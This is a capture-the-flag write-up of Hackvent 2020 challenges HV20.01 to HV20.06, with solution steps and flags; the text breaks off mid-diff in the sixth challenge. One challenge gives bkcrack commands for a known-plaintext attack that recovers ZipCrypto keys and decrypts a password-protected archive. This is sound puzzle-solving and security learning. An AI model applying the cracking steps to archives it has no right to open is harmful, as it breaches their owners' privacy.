<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <meta name="author" content="ludus" />
  <meta name="dcterms.date" content="2020-12-31" />
  <meta name="keywords" content="hackvent, hackvent-2020, hackvent2020, compass-security, ctf, security, reverse engineering" />
  <title>Hackvent 2020 - Write-up</title>
  <style>
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    span.underline{text-decoration: underline;}
    div.column{display: inline-block; vertical-align: top; width: 50%;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    ul.task-list{list-style: none;}
    pre > code.sourceCode { white-space: pre; position: relative; }
    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
    pre > code.sourceCode > span:empty { height: 1.2em; }
    code.sourceCode > span { color: inherit; text-decoration: inherit; }
    div.sourceCode { margin: 1em 0; }
    pre.sourceCode { margin: 0; }
    @media screen {
    div.sourceCode { overflow: auto; }
    }
    @media print {
    pre > code.sourceCode { white-space: pre-wrap; }
    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
    }
    pre.numberSource code
      { counter-reset: source-line 0; }
    pre.numberSource code > span
      { position: relative; left: -4em; counter-increment: source-line; }
    pre.numberSource code > span > a:first-child::before
      { content: counter(source-line);
        position: relative; left: -1em; text-align: right; vertical-align: baseline;
        border: none; display: inline-block;
        -webkit-touch-callout: none; -webkit-user-select: none;
        -khtml-user-select: none; -moz-user-select: none;
        -ms-user-select: none; user-select: none;
        padding: 0 4px; width: 4em;
        color: #aaaaaa;
      }
    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
    div.sourceCode
      {  background-color: #f8f8f8; }
    @media screen {
    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
    }
    code span.al { color: #ef2929; } /* Alert */
    code span.an { color: #8f5902; font-weight: bold; font-style: italic; } /* Annotation */
    code span.at { color: #c4a000; } /* Attribute */
    code span.bn { color: #0000cf; } /* BaseN */
    code span.cf { color: #204a87; font-weight: bold; } /* ControlFlow */
    code span.ch { color: #4e9a06; } /* Char */
    code span.cn { color: #000000; } /* Constant */
    code span.co { color: #8f5902; font-style: italic; } /* Comment */
    code span.cv { color: #8f5902; font-weight: bold; font-style: italic; } /* CommentVar */
    code span.do { color: #8f5902; font-weight: bold; font-style: italic; } /* Documentation */
    code span.dt { color: #204a87; } /* DataType */
    code span.dv { color: #0000cf; } /* DecVal */
    code span.er { color: #a40000; font-weight: bold; } /* Error */
    code span.ex { } /* Extension */
    code span.fl { color: #0000cf; } /* Float */
    code span.fu { color: #000000; } /* Function */
    code span.im { } /* Import */
    code span.in { color: #8f5902; font-weight: bold; font-style: italic; } /* Information */
    code span.kw { color: #204a87; font-weight: bold; } /* Keyword */
    code span.op { color: #ce5c00; font-weight: bold; } /* Operator */
    code span.ot { color: #8f5902; } /* Other */
    code span.pp { color: #8f5902; font-style: italic; } /* Preprocessor */
    code span.sc { color: #000000; } /* SpecialChar */
    code span.ss { color: #4e9a06; } /* SpecialString */
    code span.st { color: #4e9a06; } /* String */
    code span.va { color: #000000; } /* Variable */
    code span.vs { color: #4e9a06; } /* VerbatimString */
    code span.wa { color: #8f5902; font-weight: bold; font-style: italic; } /* Warning */
  </style>
  <link rel="stylesheet" href="pandoc.css" />
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->
</head>
<body>
<header id="title-block-header">
<h1 class="title">Hackvent 2020 - Write-up</h1>
<p class="author">ludus</p>
<p class="date">2020-12-31</p>
</header>
<nav id="TOC" role="doc-toc">
<ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#hv2001-happy-hackvent-2020">HV20.01 Happy HACKvent 2020</a>
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#approach">Approach</a></li>
<li><a href="#tools">Tools</a></li>
<li><a href="#flag">Flag</a></li>
</ul></li>
<li><a href="#hv2002-chinese-animals">HV20.02 Chinese Animals</a>
<ul>
<li><a href="#description-1">Description</a></li>
<li><a href="#approach-1">Approach</a></li>
<li><a href="#tools-1">Tools</a></li>
<li><a href="#flag-1">Flag</a></li>
</ul></li>
<li><a href="#hv2003-packed-gifts">HV20.03 Packed gifts</a>
<ul>
<li><a href="#description-2">Description</a></li>
<li><a href="#approach-2">Approach</a></li>
<li><a href="#tools-2">Tools</a></li>
<li><a href="#flag-2">Flag</a></li>
</ul></li>
<li><a href="#hv2004-brÔ∏ècelet">HV20.04 Br‚ù§Ô∏ècelet</a>
<ul>
<li><a href="#description-3">Description</a></li>
<li><a href="#approach-3">Approach</a></li>
<li><a href="#flag-3">Flag</a></li>
</ul></li>
<li><a href="#hv2005-image-dna">HV20.05 Image DNA</a>
<ul>
<li><a href="#description-4">Description</a></li>
<li><a href="#approach-4">Approach</a></li>
<li><a href="#tools-3">Tools</a></li>
<li><a href="#flag-4">Flag</a></li>
</ul></li>
<li><a href="#hv2006-twelve-steps-of-christmas">HV20.06 Twelve steps of christmas</a>
<ul>
<li><a href="#description-5">Description</a></li>
<li><a href="#approach-5">Approach</a></li>
<li><a href="#tools-4">Tools</a></li>
<li><a href="#flag-5">Flag</a></li>
</ul></li>
<li><a href="#hv2007-bad-morals">HV20.07 Bad morals</a>
<ul>
<li><a href="#description-6">Description</a></li>
<li><a href="#approach-6">Approach</a></li>
<li><a href="#tools-5">Tools</a></li>
<li><a href="#flag-6">Flag</a></li>
<li><a href="#credits">Credits</a></li>
</ul></li>
<li><a href="#hv2008-the-game">HV20.08 The game</a>
<ul>
<li><a href="#description-7">Description</a></li>
<li><a href="#approach-7">Approach</a></li>
<li><a href="#tools-6">Tools</a></li>
<li><a href="#flag-7">Flag</a></li>
</ul></li>
<li><a href="#hv2009-santas-gingerbread-factory">HV20.09 Santa's Gingerbread Factory</a>
<ul>
<li><a href="#description-8">Description</a></li>
<li><a href="#approach-8">Approach</a></li>
<li><a href="#flag-8">Flag</a></li>
<li><a href="#tools-7">Tools</a></li>
</ul></li>
<li><a href="#hv2010-be-patient-with-the-adjacent">HV20.10 Be patient with the adjacent</a>
<ul>
<li><a href="#description-9">Description</a></li>
<li><a href="#approach-9">Approach</a></li>
<li><a href="#flag-9">Flag</a></li>
<li><a href="#credits-1">Credits</a></li>
</ul></li>
<li><a href="#hv2011-chrismas-carol">HV20.11 Chris'mas carol</a>
<ul>
<li><a href="#description-10">Description</a></li>
<li><a href="#approach-10">Approach</a></li>
<li><a href="#flag-10">Flag</a></li>
<li><a href="#credits-2">Credits</a></li>
</ul></li>
<li><a href="#hv2012-wiener-waltz">HV20.12 Wiener waltz</a>
<ul>
<li><a href="#description-11">Description</a></li>
<li><a href="#approach-11">Approach</a></li>
<li><a href="#tools-8">Tools</a></li>
<li><a href="#flag-11">Flag</a></li>
<li><a href="#credits-3">Credits</a></li>
</ul></li>
<li><a href="#hv2013-twelve-steps-of-christmas">HV20.13 Twelve steps of christmas</a>
<ul>
<li><a href="#description-12">Description</a></li>
<li><a href="#approach-12">Approach</a></li>
<li><a href="#flag-12">Flag</a></li>
</ul></li>
<li><a href="#hv2014-santas-special-gift">HV20.14 Santa's Special GIFt</a>
<ul>
<li><a href="#description-13">Description</a></li>
<li><a href="#approach-13">Approach</a></li>
<li><a href="#tools-9">Tools</a></li>
<li><a href="#flag-13">Flag</a></li>
</ul></li>
<li><a href="#hv2015-man-commands-server-lost">HV20.15 Man Commands, Server Lost</a>
<ul>
<li><a href="#description-14">Description</a></li>
<li><a href="#approach-14">Approach</a></li>
<li><a href="#flag-14">Flag</a></li>
<li><a href="#tools-10">Tools</a></li>
</ul></li>
<li><a href="#hv2016-naughty-rudolph">HV20.16 Naughty Rudolph</a>
<ul>
<li><a href="#description-15">Description</a></li>
<li><a href="#approach-15">Approach</a></li>
<li><a href="#flag-15">Flag</a></li>
<li><a href="#notes-to-self">Notes to self</a></li>
</ul></li>
<li><a href="#hv2017-santas-gift-factory-control">HV20.17 Santa's Gift Factory Control</a>
<ul>
<li><a href="#description-16">Description</a></li>
<li><a href="#approach-16">Approach</a></li>
<li><a href="#flag-16">Flag</a></li>
</ul></li>
<li><a href="#hv2018-santas-lost-home">HV20.18 Santa's lost home</a>
<ul>
<li><a href="#description-17">Description</a></li>
<li><a href="#approach-17">Approach</a></li>
<li><a href="#tools-11">Tools</a></li>
<li><a href="#flag-17">Flag</a></li>
</ul></li>
<li><a href="#hv2019-docker-linter-service">HV20.19 Docker Linter Service</a>
<ul>
<li><a href="#description-18">Description</a></li>
<li><a href="#approaches">Approaches</a></li>
<li><a href="#tools-12">Tools</a></li>
<li><a href="#flag-18">Flag</a></li>
</ul></li>
<li><a href="#hv2020-twelve-steps-of-christmas">HV20.20 Twelve steps of Christmas</a>
<ul>
<li><a href="#description-19">Description</a></li>
<li><a href="#approach-18">Approach</a></li>
<li><a href="#flag-19">Flag</a></li>
</ul></li>
<li><a href="#hv2021-threatened-cat">HV20.21 Threatened Cat</a>
<ul>
<li><a href="#description-20">Description</a></li>
<li><a href="#approach-19">Approach</a></li>
<li><a href="#tools-13">Tools</a></li>
<li><a href="#flag-20">Flag</a></li>
</ul></li>
<li><a href="#hv2022-padawanlock">HV20.22 Padawanlock</a>
<ul>
<li><a href="#description-21">Description</a></li>
<li><a href="#approach-20">Approach</a></li>
<li><a href="#tools-14">Tools</a></li>
<li><a href="#flag-21">Flag</a></li>
</ul></li>
<li><a href="#hv2023-those-who-make-backups-are-cowards">HV20.23 Those who make backups are cowards!</a>
<ul>
<li><a href="#description-22">Description</a></li>
<li><a href="#approach-21">Approach</a></li>
<li><a href="#flag-22">Flag</a></li>
</ul></li>
<li><a href="#hv2024-santas-secure-data-storage">HV20.24 Santa's Secure Data Storage</a>
<ul>
<li><a href="#description-23">Description</a></li>
<li><a href="#approach-22">Approach</a></li>
<li><a href="#tools-15">Tools</a></li>
<li><a href="#flag-23">Flag</a></li>
</ul></li>
<li><a href="#hv20h1-its-a-secret">HV20.H1 It's a secret!</a>
<ul>
<li><a href="#approach-23">Approach</a></li>
<li><a href="#flag-24">Flag</a></li>
</ul></li>
<li><a href="#hv20h2-oh-another-secret">HV20.H2 Oh, another secret!</a>
<ul>
<li><a href="#flag-25">Flag</a></li>
</ul></li>
<li><a href="#hv20h3-hidden-in-plain-sight">HV20.H3 Hidden in Plain Sight</a>
<ul>
<li><a href="#approach-24">Approach</a></li>
<li><a href="#tools-16">Tools</a></li>
<li><a href="#flag-26">Flag</a></li>
</ul></li>
<li><a href="#hv20-1-twelve-steps-of-christmas">HV20.(-1) Twelve steps of christmas</a>
<ul>
<li><a href="#description-24">Description</a></li>
<li><a href="#approach-25">Approach</a></li>
<li><a href="#tools-involved">Tools involved</a></li>
<li><a href="#flag-27">Flag</a></li>
</ul></li>
</ul>
</nav>
<h1 id="introduction">Introduction</h1>
<p>It's Hackvent again!! But 2020 was still going at full speed and I really was in doubt, whether I would manage to bring up the time to solve all the challenges in time. As usual I started with the idea to drop out at some point when work and HackVent would not fit into 24 hours anymore (did someone mention sleep?).</p>
<p>This year, the event started early on the 1st advent (the 29th of November 2020), which is really nice as I usually almost can't wait for it to start.</p>
<p>The following chapters describe how each one of the challenges was solved.</p>
<p>This year I managed to solve all challenges, with one late submission, which is why I (ludus) don't figure in the top of the ranking. On day 16, Naughty Rudolph furbld that cube a little too hard, so I submitted the flag 23 minutes late.</p>
<p>I also want to mention that I would not have been able to submit almost all flags in time if there weren't some elves pulling me out of the numerous rabbit holes or even pushing into the right direction.</p>
<p>Huge thanks go to:</p>
<ul>
<li><em>mcia</em></li>
<li><em>The Compiler</em></li>
<li><em>Bread</em></li>
<li><em>0xdf</em></li>
<li><em>jokker</em></li>
</ul>
<p>Many thanks also go to the organising team from Compass and to all the challenge authors!! It's a great event that I look forward to every year.</p>
<p>This year, in contrast to previous years, I found the level of the challenges to be more evened out throughout the entire month. I.e. harder challenges in the beginning, and less increase in the process.</p>
<p>Some challenges had a very guessy component, which is something I don't like too much.</p>
<p>Thanks to a more community driven approach I was able to unblock myself with the help of others either from the Discord server or via other channels.</p>
<p>Dear reader, have fun going through the challenges and my solutions. It would be great hearing from you if this inspires you to participate next year.</p>
<p>Yours,</p>
<p>- ludus</p>
<h1 id="hv2001-happy-hackvent-2020">HV20.01 Happy HACKvent 2020</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>mij-the-dj</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>easy</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>forensics</code></td>
</tr>
</tbody>
</table>
<h2 id="description">Description</h2>
<p>Welcome to this year's HACKvent.</p>
<p>Attached you can find the "Official" invitation to the HackVent.</p>
<p><img src="./7c432457-ed44-4ebe-84bf-cb6966e7a3dc.png" /></p>
<p>One of my very young Cyber Elves cut some parts of the card with his alpha scissors.</p>
<p>Have a great HACKvent,</p>
<p>‚Äì Santa</p>
<h2 id="approach">Approach</h2>
<p>The "alpha scissors" hint in combination with the image's different appearance when being opened on my system made me think quickly that there must be a transparency (or "alpha") channel in the image.</p>
<p>Using the GIMP, I hid the image's Alpha channel and left RGB channels visible. That's how the flag became visible:</p>
<p><img src="./solution-w-gimp.png" /></p>
<h2 id="tools">Tools</h2>
<ul>
<li><a href="https://www.gimp.org/">The GIMP</a></li>
</ul>
<h2 id="flag">Flag</h2>
<p><code>HV20{7vxFXB-ItHnqf-PuGNqZ}</code></p>
<h1 id="hv2002-chinese-animals">HV20.02 Chinese Animals</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>The Compiler</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>easy</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>fun</code></td>
</tr>
</tbody>
</table>
<h2 id="description-1">Description</h2>
<p>I've received this note from a friend, who is a Chinese CTF player:</p>
<p><code>ÊÅ≠ÂñúÔºÅÊî∂ÊóóÁà≤ÔºöÔº®Ôº∂ÔºíÔºêÔΩõÁç≠ÊÖ¨Ê∞≠Êï¨ÊïßÊÖÆÁê≠ÊâµÁë¥Êï≤Êô¨Á§≠Ê±ØÁô•Áå≠Êù≤ÊÖ≥Áå≠ÊµµÊê≠Ê°ØÁâ≥ÔΩÖ</code></p>
<p>Unfortunately, Google Translate wasn't of much help: <img src="./9362e5e7-61d3-4060-81e6-da9fbf5327d3.png" /></p>
<p><img src="./e496ffb6-ee2d-45bc-aa6b-3a81a2de4618.png" /></p>
<p>I suspect the data has somehow been messed up while transmitting it.</p>
<p>Sadly, I can't ask my friend about more details. The Great Chinese Firewall is thwarting our attempts to reach each other, and there's no way I'm going to install WeChat on my phone.</p>
<h2 id="approach-1">Approach</h2>
<p>Encodings, encodings...</p>
<p>This challenge was pretty much a guessing challenge as there were no real hints in the challenge description. This confused me as my first reflex was indeed to go for an encoding-related solution. However, I then remembered previous CTFs with similar rabbit holes which ended up nowhere, so I refrained and tried to make sense from the "hints" at hand.</p>
<p>Turns out, I have a talent to go down rabbit holes. In the end, we simply had to encode the string in the flag with <strong>UTF-16BE</strong>, which produces the string <code>small-elegant-butterfly-loves-grass-mud-hors</code>, which in turn looks strangely like the contents of a HV20 flag.</p>
<h2 id="tools-1">Tools</h2>
<ul>
<li><a href="https://gchq.github.io/CyberChef">CyberChef</a></li>
</ul>
<h2 id="flag-1">Flag</h2>
<p><code>HV20{small-elegant-butterfly-loves-grass-mud-horse}</code></p>
<h1 id="hv2003-packed-gifts">HV20.03 Packed gifts</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>darkstar</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>easy</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>crypto</code></td>
</tr>
</tbody>
</table>
<h2 id="description-2">Description</h2>
<p>One of the elves has unfortunately added a password to the last presents delivery and we cannot open it. The elf has taken a few days off after all the stress of the last weeks and is not available. Can you open the package for us?</p>
<p>We found the following packages:</p>
<p><a href="./790ccd6f-cd84-452c-8bee-7aae5dfe2610.zip">Package 1</a> <a href="./941fdd96-3585-4fca-a2dd-e8add81f24a1.zip">Package 2</a></p>
<h2 id="approach-2">Approach</h2>
<p>In an attempt to unzip the two files we realise that Package 2 (<code>941fdd96-3585-4fca-a2dd-e8add81f24a1.zip</code>) is password protected in contrast to Package 1.</p>
<p>Runnin <code>unzip -vl 790ccd6f-cd84-452c-8bee-7aae5dfe2610.zip</code> and <code>unzip -vl 941fdd96-3585-4fca-a2dd-e8add81f24a1.zip</code>, we also see that the password protected zip file contains a file called <code>flag.bin</code>, which is not present in the other package. All other files seem to be named the same and have the same timestamp. However, CRCs are different - with one exception.</p>
<p>Given that we have to deal with legacy zip file encryption (and not AES encryption, we can find that out if <code>7z l -slt &lt;zip file&gt;</code> prints something like <code>"ZipCrypto Deflate"</code>) and if there is indeed a same file in both archives, we can run a "known-plaintext" attack to find the encrypting key and use it to extract the flag from the encrypted zip file.</p>
<p>Comparing CRCs, we find that both files <code>0053.bin</code> have the matching CRC <code>fcd6b08a</code>.</p>
<p>Let's start a Plaintext attack on file 0053.bin using <code>bkcrack</code> (the result of some Google Fu):</p>
<pre><code>bkcrack -C 941fdd96-3585-4fca-a2dd-e8add81f24a1.zip -c 0053.bin -P 790ccd6f-cd84-452c-8bee-7aae5dfe2610.zip -p 0053.bin
</code></pre>
<p><code>bkcrack</code> finds encrypting keys <code>2445b967 cfb14967 dceb769b</code>. To extract the file we run</p>
<pre><code>bkcrack -C 941fdd96-3585-4fca-a2dd-e8add81f24a1.zip -c flag.bin -k 2445b967 cfb14967 dceb769b -d flag_deflated.txt
</code></pre>
<p>Inflate the resulting file (see flag.b64.txt): <code>python3 inflate.py &lt; flag_deflated.txt &gt; flag.b64.txt</code></p>
<p>The inflating script was taken from <a href="https://github.com/kimci86/bkcrack/blob/master/tools/inflate.py">https://github.com/kimci86/bkcrack/blob/master/tools/inflate.py</a>:</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb3-1"><a href="#cb3-1"></a><span class="im">import</span> sys</span>
<span id="cb3-2"><a href="#cb3-2"></a><span class="im">import</span> zlib</span>
<span id="cb3-3"><a href="#cb3-3"></a></span>
<span id="cb3-4"><a href="#cb3-4"></a><span class="kw">def</span> inflate(data):</span>
<span id="cb3-5"><a href="#cb3-5"></a>    <span class="co">&quot;&quot;&quot;Returns uncompressed data.&quot;&quot;&quot;</span></span>
<span id="cb3-6"><a href="#cb3-6"></a>    <span class="cf">return</span> zlib.decompress(data, <span class="op">-</span>zlib.MAX_WBITS)</span>
<span id="cb3-7"><a href="#cb3-7"></a></span>
<span id="cb3-8"><a href="#cb3-8"></a><span class="kw">def</span> main():</span>
<span id="cb3-9"><a href="#cb3-9"></a>    <span class="co">&quot;&quot;&quot;Read deflate compressed data from stdin and write uncompressed data to stdout.&quot;&quot;&quot;</span></span>
<span id="cb3-10"><a href="#cb3-10"></a>    sys.stdout.<span class="bu">buffer</span>.write(inflate(sys.stdin.<span class="bu">buffer</span>.read()))</span>
<span id="cb3-11"><a href="#cb3-11"></a></span>
<span id="cb3-12"><a href="#cb3-12"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&quot;__main__&quot;</span>:</span>
<span id="cb3-13"><a href="#cb3-13"></a>    main()</span></code></pre></div>
<p>Base64 decode the resulting string (see flag.txt): <code>base64 -d flag.b64.txt &gt; flag.txt</code></p>
<h2 id="tools-2">Tools</h2>
<ul>
<li><a href="https://github.com/kimci86/bkcrack">bkcrack</a></li>
</ul>
<h2 id="flag-2">Flag</h2>
<p><code>HV20{ZipCrypt0_w1th_kn0wn_pla1ntext_1s_easy_t0_decrypt}</code></p>
<h1 id="hv2004-brÔ∏ècelet">HV20.04 Br‚ù§Ô∏ècelet</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>brp64 (with the help of his daugther)</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>easy</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>fun</code></td>
</tr>
</tbody>
</table>
<h2 id="description-3">Description</h2>
<p>Santa was given a nice bracelet by one of his elves. Little does he know that the secret admirer has hidden a message in the pattern of the bracelet...</p>
<p><img src="./7a95aa57-0faf-4eab-bbc3-b9d350795966.jpg" alt="br‚ù§Ô∏ècelet" /></p>
<h3 id="hints">Hints</h3>
<ul>
<li>No internet is required - only the bracelet</li>
<li>The message is encoded in binary</li>
<li>Violet color is the delimiter</li>
<li>Colors have a fixed order</li>
<li>Missing colors matter</li>
</ul>
<h2 id="approach-3">Approach</h2>
<p>Rabbit hole alert</p>
<p>Transcribing the 5 bracelet colors (<strong>g</strong>reen, <strong>m</strong>agenta, <strong>p</strong>ink, <strong>y</strong>ellow, <strong>b</strong>lue) gives the following string:</p>
<pre><code>gmpymgbmpgmgbmpgbymgbymgbmbymbymgbympymbymmgbymgymgymbymbymgmgbmpgbmbymgbymbymgm
</code></pre>
<Insert many unsuccessful attempts here>

<p>At some point the hint with violet/magenta being the separator was published, which gave the following:</p>
<pre><code>&quot;m&quot; as separator
g|py|gb|pg|gb|pgby|gby|gb|by|by|gby|py|by| |gby|gy|gy|by|by|g|gb|pgb|by|gby|by|g|
</code></pre>
<p>If <code>m</code> was the separator, 4 more colors remain. Looking at the split string, one notices that <code>y</code>, if present, is always located on the very right. <code>b</code> was always on the right, unless there is <code>y</code>, etc. So here's the fixed order from the hints.</p>
<p>With that, I assigned values being a power of 2 to each color (a bit randomly and in a desparate move):</p>
<table>
<thead>
<tr class="header">
<th>Color</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>y</td>
<td>1</td>
</tr>
<tr class="even">
<td>b</td>
<td>2</td>
</tr>
<tr class="odd">
<td>g</td>
<td>4</td>
</tr>
<tr class="even">
<td>p</td>
<td>8</td>
</tr>
</tbody>
</table>
<p>Summing these up, produces the following string of hex values:</p>
<pre><code>g|py|gb|pg|gb|pgby|gby|gb|by|by|gby|py|by| |gby|gy|gy|by|by|g|gb|pgb|by|gby|by|g|
4 9  6  C  6  F    7   6  3  3  7   9  3  0 7   5  5  3  3  4 6  E   3  7   3  4
</code></pre>
<p>which decodes to <code>Ilov3y0uS4n74</code>.</p>
<p>I only realised when re-working my write-up that the colors represent bits. Each color/bit can either be present/1 or absent/0. However, one first had still to discover/guess that magenta was the separator.</p>
<h2 id="flag-3">Flag</h2>
<p><code>HV20{Ilov3y0uS4n74}</code></p>
<h1 id="hv2005-image-dna">HV20.05 Image DNA</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>blaknyte0</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>easy</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>forensics</code>, <code>crypto</code></td>
</tr>
</tbody>
</table>
<h2 id="description-4">Description</h2>
<p>Santa has thousands of Christmas balls in stock. They all look the same, but he can still tell them apart. Can you see the difference?</p>
<p><img src="./6bbc452b-6a32-4a72-b74f-07b7ad7b181d.jpg" alt="Christmas ball 1" /> <img src="./cf505372-330b-4b34-a95b-59fa33db37f8.jpg" alt="Christmas ball 2" /></p>
<h2 id="approach-4">Approach</h2>
<p><code>strings</code> on the images gave a long string in the end of both files including only chars A, C, G and T. Googling led to <a href="https://www.genome.gov/genetics-glossary/acgt">https://www.genome.gov/genetics-glossary/acgt</a>. Ok, the challenge's title already hinted it, so now it's confirmed: it's got something to do with DNA.</p>
<pre><code>$ strings 6bbc452b-6a32-4a72-b74f-07b7ad7b181d.jpg | tail -n1
CTGTCGCGAGCGGATACATTCAAACAATCCTGGGTACAAAGAATAAAACCTGGGCAATAATTCACCCAAACAAGGAAAGTAGCGAAAAAGTTCCAGAGGCCAAA

$ strings cf505372-330b-4b34-a95b-59fa33db37f8.jpg | tail -n1
ATATATAAACCAGTTAATCAATATCTCTATATGCTTATATGTCTCGTCCGTCTACGCACCTAATATAACGTCCATGCGTCACCCCTAGACTAATTACCTCATTC
</code></pre>
<p>I stumbled on <a href="https://esolangs.org/wiki/DNA-Sharp">DNA-Sharp</a> was a deeeeep rabbit hole - but I should have reacted earlier, when at least one of the two strings did not parse correctly.</p>
<p>Further rabbit holes were ahead: The following pages both indicated some mapping between ACGT and 0-3 combinations.</p>
<ul>
<li><a href="https://ch.mathworks.com/matlabcentral/fileexchange/68817-dna-crytography-with-encoding-and-decoding-text-message">https://ch.mathworks.com/matlabcentral/fileexchange/68817-dna-crytography-with-encoding-and-decoding-text-message</a></li>
<li><a href="https://github.com/jokergoo/Crypt-DNASequence">https://github.com/jokergoo/Crypt-DNASequence</a> ---&gt; unrelated, but the same mapping ACGT=&gt;bin.</li>
</ul>
<p>More information was needed. Running <code>binwalk</code> on the files resulted in a file named <code>A</code> on one of the files. It contained <code>00</code>.</p>
<p>Also, diffing the two images using ImageMagick (<code>compare image1 image2 -compose src diff.png</code>) shows that one of them contains slightly different data: <img src="./diff.png" alt="Diff" /></p>
<p>Steghide to the help! Running <code>steghide extract -sf 6bbc452b-6a32-4a72-b74f-07b7ad7b181d.jpg</code> (without any password) produced a file <code>T.png</code> showing only <code>11</code>.</p>
<p>Finally, since it's an easy challenge I tried mapping each of the 4 characters to two bits as follows:</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1"></a><span class="bu">echo</span> <span class="op">&lt;</span>ACGT-string<span class="op">&gt;</span> <span class="kw">|</span> <span class="fu">sed</span> <span class="st">&#39;s/A/00/g;s/C/01/g;s/G/10/g;s/T/11/g&#39;</span><span class="kw">`</span></span></code></pre></div>
<p>XOR the two resulting strings (in binary format) - and tadaa - <a href="https://gchq.github.io/CyberChef/#recipe=From_Binary%28&#39;None&#39;%29XOR%28%7B&#39;option&#39;:&#39;Binary&#39;,&#39;string&#39;:&#39;0111101101100110001001101000110001001111010000000100001101011110101011000100000010000011000000000101111010100100001100001111010001010100000001000010100000001011001001100000000000101111010100100010100101000000&#39;%7D,&#39;Standard&#39;,false%29&amp;input=MDAxMTAwMTEwMDExMDAwMDAwMDEwMTAwMTAxMTExMDAwMDExMDEwMDAwMTEwMDExMDExMTAxMTEwMDExMDAxMTEwMDExMTExMDAxMTAwMTExMDExMDExMTAxMTAxMTAxMDExMDExMDExMTAwMDExMDAxMDAwMTAxMTEwMDAwMTEwMDExMDAwMDAxMTAxMTAxMDEwMDExMTAwMTEwMTEwMTAwMDEwMTAxMDExMTAwMTAwMDAxMTEwMDAwMTExMTAwMDEwMTExMDEwMDExMTEwMQ">the flag</a></p>
<h2 id="tools-3">Tools</h2>
<ul>
<li>CyberChef</li>
<li>Sed</li>
<li>strings</li>
<li>binwalk</li>
<li>ImageMagick (compare)</li>
</ul>
<h2 id="flag-4">Flag</h2>
<p><code>HV20{s4m3s4m3bu7diff3r3nt}</code></p>
<h1 id="hv2006-twelve-steps-of-christmas">HV20.06 Twelve steps of christmas</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>Bread (aka üçû)</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>medium</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>fun</code></td>
</tr>
</tbody>
</table>
<h2 id="description-5">Description</h2>
<p>On the sixth day of Christmas my true love sent to me...</p>
<ul>
<li>six valid QRs,</li>
<li>five potential scrambles,</li>
<li>four orientation bottom and right, and the rest has been said previously.</li>
</ul>
<p><img src="./9a96751d-16db-45db-ae61-ecd83ca67dab.png" alt="Foldable 2x2 QR code Rubik cube" /></p>
<p><a href="./aea7c5d7-2cd3-4c23-8711-5579f766549c.pdf">PDF version</a> <a href="./7745495e-d40f-49e5-85d7-749a562beff9.pxd">Source image</a> (open with <a href="https://pixlr.com/e/">pixlr.com</a>)</p>
<h3 id="requirements">Requirements</h3>
<ul>
<li>a printer</li>
</ul>
<h3 id="hints-1">Hints</h3>
<ul>
<li>selbmarcs</li>
<li>The black lines are important - do not remove them</li>
</ul>
<h2 id="approach-5">Approach</h2>
<p>Cut image into tiles:</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1"></a><span class="ex">convert</span> cropped.png -crop 189x189 +repage +adjoin rubiks_pieces.png</span></code></pre></div>
<p>Next, I looked for a 2x2 Rubiks Cube solver, which I found at <a href="https://github.com/MeepMoop/py222">https://github.com/MeepMoop/py222</a>.</p>
<p>With the following minor adjustment, each tile had an index, which allowed to identify tiles even after scrambling the cube.</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb10-1"><a href="#cb10-1"></a><span class="kw">diff --git a/py222.py b/py222.py</span></span>
<span id="cb10-2"><a href="#cb10-2"></a>index 257882e..54bf3e4 100644</span>
